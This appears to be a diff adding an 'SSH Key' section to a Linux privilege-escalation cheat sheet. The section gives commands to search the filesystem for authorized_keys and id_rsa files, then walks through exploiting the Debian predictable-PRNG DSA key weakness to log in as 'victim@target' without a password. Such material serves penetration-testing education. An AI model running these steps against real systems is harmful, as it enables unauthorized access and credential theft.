@@ -10,6 +10,9 @@
     * [Last edited files](#last-edited-files)
     * [In memory passwords](#in-memory-passwords)
     * [Find sensitive files](#find-sensitive-files)
+* [SSH Key](#ssh-key)
+    * [Sensitive files](#sensitive-files)
+    * [SSH Key Predictable PRNG (Authorized_Keys) Process](#ssh-key-predictable-prng-authorized_keys-process)
 * [Scheduled tasks](#scheduled-tasks)
     * [Cron jobs](#cron-jobs)
     * [Systemd timers](#systemd-timers)
@@ -181,6 +184,61 @@ $ locate password | more
 /lib/live/config/0031-root-password
 ...
 ```
+
+## SSH Key
+
+### Sensitive files
+
+```
+find / -name authorized_keys 2> /dev/null
+find / -name id_rsa 2> /dev/null
+...
+```
+
+### SSH Key Predictable PRNG (Authorized_Keys) Process
+
+This module describes how to attempt to use an obtained authorized_keys file on a host system.
+
+Needed : SSH-DSS String from authorized_keys file
+
+**Steps**
+
+1. Get the authorized_keys file. An example of this file would look like so:
+
+```
+ssh-dss AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf ... (snipped) ... 
+```
+
+2. Since this is an ssh-dss key, we need to add that to our local copy of `/etc/ssh/ssh_config` and `/etc/ssh/sshd_config`:
+
+```
+echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/ssh_config
+echo "PubkeyAcceptedKeyTypes=+ssh-dss" >> /etc/ssh/sshs_config
+/etc/init.d/ssh restart
+```
+
+3. Get [g0tmi1k's debian-ssh repository](https://github.com/g0tmi1k/debian-ssh) and unpack the keys:
+
+```
+git clone https://github.com/g0tmi1k/debian-ssh
+cd debian-ssh
+tar vjxf common_keys/debian_ssh_dsa_1024_x86.tar.bz2
+```
+
+4. Grab the first 20 or 30 bytes from the key file shown above starting with the `"AAAA..."` portion and grep the unpacked keys with it as:
+
+```
+grep -lr 'AAAA487rt384ufrgh432087fhy02nv84u7fg839247fg8743gf087b3849yb98304yb9v834ybf'
+dsa/1024/68b329da9893e34099c7d8ad5cb9c940-17934.pub
+```
+
+5. IF SUCCESSFUL, this will return a file (68b329da9893e34099c7d8ad5cb9c940-17934.pub) public file. To use the private key file to connect, drop the '.pub' extension and do:
+
+```
+ssh -vvv victim@target -i 68b329da9893e34099c7d8ad5cb9c940-17934
+```
+
+And you should connect without requiring a password. If stuck, the `-vvv` verbosity should provide enough details as to why.
 
 ## Scheduled tasks
 
@@ -697,3 +755,4 @@ https://www.exploit-db.com/exploits/18411
 - [Privilege Escalation by injecting process possessing sudo tokens - @nongiach @chaignc](https://github.com/nongiach/sudo_inject)
 * [Linux Password Security with pam_cracklib - Hal Pomeranz, Deer Run Associates](http://www.deer-run.com/~hal/sysadmin/pam_cracklib.html)
 * [Local Privilege Escalation Workshop - Slides.pdf - @sagishahar](https://github.com/sagishahar/lpeworkshop/blob/master/Local%20Privilege%20Escalation%20Workshop%20-%20Slides.pdf)
+* [SSH Key Predictable PRNG (Authorized_Keys) Process - @weaknetlabs](https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Vulnerabilities/SSH/key-exploit.md)
